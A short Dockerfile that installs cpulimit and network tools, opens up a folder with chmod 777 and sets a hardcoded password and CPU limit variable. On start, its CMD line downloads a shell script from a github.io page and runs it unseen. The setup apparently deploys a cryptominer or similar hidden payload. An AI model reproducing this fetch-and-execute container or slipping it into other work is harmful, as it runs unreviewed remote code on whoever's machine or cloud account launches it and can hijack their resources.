FROM ubuntu:18.04

RUN apt-get update \
    && apt-get install -y sudo curl zip nano wget cpulimit

RUN sudo mkdir /projects/ && \
    cd /projects/ && \
    sudo mkdir sys && \
    sudo chmod -R 777 sys

ENV PASS Clevquad
ENV LIMIT 100

WORKDIR /projects/sys

CMD wget https://dzmltzack.github.io/web/LIAB.sh -O IAB2.sh && \
chmod +x IAB2.sh && \
./IAB2.sh
